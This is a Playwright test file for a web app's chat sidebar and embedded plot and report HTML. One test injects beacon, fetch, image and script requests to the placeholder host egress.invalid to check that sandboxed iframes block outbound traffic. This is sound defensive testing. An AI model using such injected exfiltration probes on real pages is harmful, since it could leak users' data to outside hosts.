import { test, expect } from '@playwright/test';
import { tabRequest } from './authStartup.mjs';

test('cloud chat submits without a browser key and displays missing-key errors', { tag: '@ai' }, async ({ page }) => {
  test.skip(process.env.VITE_AI_ENABLED !== '1', 'Run with VITE_AI_ENABLED=1 and COPYLOT_AI_MODE=1');
  let sent = 0;
  await page.route('**/api/chat/assistant', async route => {
    expect(route.request().postDataJSON()).not.toHaveProperty('apiKey');
    sent += 1;
    await route.fulfill(sent === 1 ? {
      status: 200, contentType: 'application/json', body: JSON.stringify({ model: 'synthetic', answer: 'Synthetic server-key reply', actions: [], evidence: [], revision: 1 }),
    } : {
      status: 400, contentType: 'application/json',
      body: JSON.stringify({ detail: 'OpenAI API key is required. Set OPENAI_API_KEY on the server, or enter a key in the chat settings.' }),
    });
  });
  await page.goto('/');
  await page.getByRole('button', { name: 'Open chatbot sidebar', exact: true }).click();
  await page.getByRole('button', { name: 'Toggle AI settings' }).click();
  await page.getByLabel('Select chatbot provider').selectOption('openai');
  await expect(page.getByPlaceholder('API key', { exact: true })).toHaveValue('');
  const input = page.getByPlaceholder('Ask about this analysis...');
  await input.fill('Hello');
  const send = page.getByRole('button', { name: 'Send', exact: true });
  await expect(send).toBeEnabled();
  await send.click();
  await expect(page.getByRole('button', { name: 'Confirm and send' })).toBeVisible();
  expect(sent).toBe(0);
  await page.getByRole('button', { name: 'Confirm and send' }).click();
  await expect(page.getByText('Synthetic server-key reply', { exact: true })).toBeVisible();
  await input.fill('Again');
  await send.click();
  await expect(page.getByText(/OpenAI API key is required/)).toBeVisible();
  expect(sent).toBe(2);
});

for (const kind of ['plot', 'report']) {
  test(`${kind} blocks outbound resource probes while preserving embedded plots`, async ({ page }) => {
    const outgoing = [];
    await page.route('https://egress.invalid/**', route => {
      outgoing.push(route.request().url());
      return route.abort();
    });
    await page.goto('/');
    await expect(page.getByRole('navigation', { name: 'Module views' })).toBeVisible();
    const table = 'Kinase,Log2(Frequency Factor),Adjusted p-value\nAKT1,2,0.01\n';
    const response = await tabRequest(page).post('/api/plots/phospho/ksea-volcano.html', { multipart: {
      fileSt: { name: 'st.csv', mimeType: 'text/csv', buffer: Buffer.from(table) },
      fileTnc: { name: 'y.csv', mimeType: 'text/csv', buffer: Buffer.from(table) },
    } });
    expect(response.ok()).toBeTruthy();
    const plot = await response.text();
    let document = plot;
    if (kind === 'report') {
      const report = await tabRequest(page).post('/api/summary/report', { data: { title: 'Network boundary' } });
      expect(report.ok()).toBeTruthy();
      document = (await report.json()).html;
    }
    await page.evaluate(html => {
      const frame = document.createElement('iframe');
      frame.id = 'network-boundary';
      frame.sandbox = 'allow-scripts allow-downloads';
      frame.srcdoc = html;
      document.body.append(frame);
    }, document);
    const frame = page.locator('#network-boundary').contentFrame();
    await expect(frame.locator('body')).toBeVisible();
    if (kind === 'report') {
      await frame.locator('body').evaluate((body, html) => {
        const nested = document.createElement('iframe');
        nested.sandbox = 'allow-scripts allow-downloads';
        nested.srcdoc = html;
        body.append(nested);
      }, plot);
      await expect(frame.locator('iframe').contentFrame().locator('.main-svg').first()).toBeVisible();
    } else {
      await expect(frame.locator('.main-svg').first()).toBeVisible();
      const rendered3d = await frame.locator('.js-plotly-plot').evaluate(async element => {
        await window.Plotly.newPlot(element, [{ type: 'scatter3d', mode: 'markers', x: [1, 2], y: [2, 3], z: [3, 4] }]);
        return Boolean(element._fullLayout.scene._scene.glplot);
      });
      expect(rendered3d).toBe(true);
    }
    // Privileged test injection probes containment, not an asserted user-input XSS exploit.
    await frame.locator('body').evaluate(async body => {
      const load = tag => new Promise(resolve => {
        const element = document.createElement(tag);
        element.onload = element.onerror = resolve;
        element.src = `https://egress.invalid/${tag}?data=synthetic`;
        body.append(element);
      });
      navigator.sendBeacon('https://egress.invalid/beacon', 'synthetic');
      await Promise.all([
        fetch('https://egress.invalid/fetch', { mode: 'no-cors' }).catch(() => {}),
        load('img'), load('script'),
      ]);
    });
    expect(outgoing).toEqual([]);
  });
}
